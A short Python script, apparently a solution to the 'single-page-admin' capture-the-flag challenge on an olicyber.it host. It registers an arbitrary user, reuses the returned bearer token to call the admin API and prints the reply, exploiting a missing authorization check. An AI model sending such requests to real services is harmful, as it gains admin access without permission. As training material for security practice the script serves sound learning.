import requests
import json

url = "https://single-page-admin.challs.olicyber.it/"

s = requests.Session()

r = s.post(url + "api/register", json = {"username" : "RandomUser"})
token = json.loads(r.text)["token"]

header = {
    "authorization" : f"Bearer {token}"
}

r = s.post(url + "api/admin", headers=header)
print(json.loads(r.text)["message"])